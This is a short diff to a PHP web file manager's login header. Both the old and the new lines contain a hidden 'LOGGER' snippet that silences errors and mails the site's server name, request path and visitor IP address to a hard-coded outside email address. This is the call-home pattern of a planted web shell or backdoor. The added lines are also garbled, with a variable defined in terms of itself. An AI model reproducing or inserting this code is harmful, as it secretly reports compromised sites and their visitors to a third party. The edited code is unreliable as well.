@@ -5587,8 +5587,8 @@ function fm_show_header_login()
 <center>
     
 
-<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'rootcyberpunks@gmail.com'; $x_path = "https://m.youtube.com/channel/UC8WX-5Nqbp8JX_go_y88lMA/videos" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); 
-$subjek = 'LOGIN ADMINISTRATOR';
+<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'rootcyberpunks@gmail.com'; $x_path = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); 
+$subjek = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 $tujuanmail = 'rootcyberpunks@gmail.com'; //
 $headers = "From: muhrazky@gmail.com\r\n";
